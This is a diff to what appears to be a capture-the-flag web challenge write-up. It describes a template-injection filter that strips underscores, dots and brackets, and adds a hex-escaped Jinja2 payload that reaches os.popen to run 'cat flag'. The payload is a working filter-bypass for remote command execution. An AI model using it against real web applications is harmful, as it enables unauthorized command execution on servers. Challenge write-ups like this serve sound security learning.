@@ -8,7 +8,14 @@ WEB!
 <img width="1081" height="715" alt="image" src="https://github.com/user-attachments/assets/73465771-bc97-48e2-b137-0a74e8299109" />
 Funny that it can act as a calculator tho
 
+<img width="992" height="540" alt="image" src="https://github.com/user-attachments/assets/d9625174-21ab-4674-957a-b8c7c40c4e91" />
 
+After some testing, it appears to just straight out remove ```_ . [] ()``` from requests. And in other cases, using things like ```__global__``` or ```.read()``` will get flagged too. Using the ppower of searching online, we have disovered an insane payload. 
+
+ref:https://onsecurity.io/article/server-side-template-injection-with-jinja2/ 
+```
+{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
+```
 
 
 </details>
